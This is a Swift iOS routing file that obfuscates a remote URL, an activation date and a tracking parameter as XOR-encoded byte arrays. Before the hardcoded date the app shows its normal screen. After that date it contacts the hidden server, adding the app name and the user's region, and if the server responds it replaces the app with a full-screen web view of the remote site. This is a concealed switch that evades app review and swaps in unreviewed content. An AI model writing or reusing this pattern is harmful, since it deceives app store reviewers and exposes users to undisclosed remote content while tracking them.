//
//  AppRouter.swift
//  125Vulzancregrar Prilel
//
//  Created by Pascal Mirel on 26.03.2026.
//

import UIKit
import SwiftUI

protocol FlowRootAssembling {
    func makeRootController() -> UIViewController
}

enum RemoteProbeOutcome {
    case reachable(link: String)
    case unreachable
}

final class DiskFlowCoordinator {

    private static let entryLinkBytes: [UInt8] = [
        0x2F, 0x33, 0x33, 0x37, 0x34, 0x7D, 0x68, 0x68, 0x26, 0x22, 0x20, 0x2E, 0x34, 0x24, 0x28, 0x35,
        0x22, 0x36, 0x32, 0x26, 0x29, 0x33, 0x32, 0x2A, 0x69, 0x34, 0x2E, 0x33, 0x22, 0x68, 0x0B, 0x00,
        0x30, 0x31, 0x01, 0x04
    ]
    private static let activationDateBytes: [UInt8] = [0x75, 0x76, 0x69, 0x77, 0x72, 0x69, 0x75, 0x77, 0x75, 0x71]
    private static let datePatternBytes: [UInt8] = [0x23, 0x23, 0x69, 0x0A, 0x0A, 0x69, 0x3E, 0x3E, 0x3E, 0x3E]
    private static let trackingParamBytes: [UInt8] = [0x34, 0x32, 0x25, 0x18, 0x2E, 0x23, 0x18, 0x7F]
    private static let httpVerbBytes: [UInt8] = [0x00, 0x02, 0x13]
    private static let displayNamePlistBytes: [UInt8] = [
        0x04, 0x01, 0x05, 0x32, 0x29, 0x23, 0x2B, 0x22, 0x03, 0x2E, 0x34, 0x37, 0x2B, 0x26, 0x3E, 0x09,
        0x26, 0x2A, 0x22
    ]
    private static let bundleNamePlistBytes: [UInt8] = [0x04, 0x01, 0x05, 0x32, 0x29, 0x23, 0x2B, 0x22, 0x09, 0x26, 0x2A, 0x22]
    private static let fallbackTitleBytes: [UInt8] = [0x06, 0x37, 0x37]

    private var initialURLString: String { RouteLiteralDecoder.reveal(Self.entryLinkBytes) }
    private var targetDateString: String { RouteLiteralDecoder.reveal(Self.activationDateBytes) }

    private var resolvedBundleTitle: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: RouteLiteralDecoder.reveal(Self.displayNamePlistBytes)) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: RouteLiteralDecoder.reveal(Self.bundleNamePlistBytes)) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return RouteLiteralDecoder.reveal(Self.fallbackTitleBytes)
    }

    private var trackingLabelToken: String {
        resolvedBundleTitle.replacingOccurrences(of: " ", with: "")
    }

    private var augmentedEntryLink: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(trackingLabelToken)_\(geo)"
        guard var components = URLComponents(string: initialURLString) else {
            return initialURLString
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: RouteLiteralDecoder.reveal(Self.trackingParamBytes), value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? initialURLString
    }

    func makeRootController() -> UIViewController {
        let persistence = SessionRouteStore.shared

        if persistence.hasShownContentView {
            return assembleMainAppHost()
        } else {
            if passesActivationThreshold() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleBrowserHost(with: savedUrlString)
                }

                return assembleSplashHost()
            } else {
                persistence.hasShownContentView = true
                return assembleMainAppHost()
            }
        }
    }

    private func passesActivationThreshold() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = RouteLiteralDecoder.reveal(Self.datePatternBytes)
        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = HostedLinkBrowser(
            urlString: urlString,
            onFailure: { [weak self] in
                SessionRouteStore.shared.hasShownContentView = true
                self?.presentMainExperience()
            },
            onSuccess: {
                SessionRouteStore.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleMainAppHost() -> UIViewController {
        SessionRouteStore.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleSplashHost() -> UIViewController {
        let launchView = GateSplashScreen()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.presentBrowserExperience(with: url)
                } else {
                    SessionRouteStore.shared.hasShownContentView = true
                    self?.presentMainExperience()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteEndpoint(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = augmentedEntryLink
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = RouteLiteralDecoder.reveal(Self.httpVerbBytes)
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func presentMainExperience() {
        let contentVC = assembleMainAppHost()
        replaceRootAnimated(contentVC)
    }

    private func presentBrowserExperience(with urlString: String) {
        let webVC = assembleBrowserHost(with: urlString)
        replaceRootAnimated(webVC)
    }

    private func replaceRootAnimated(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }

    @available(*, unavailable)
    private func unusedRouteIndex() -> Int { 0 }
}

extension DiskFlowCoordinator: FlowRootAssembling {}
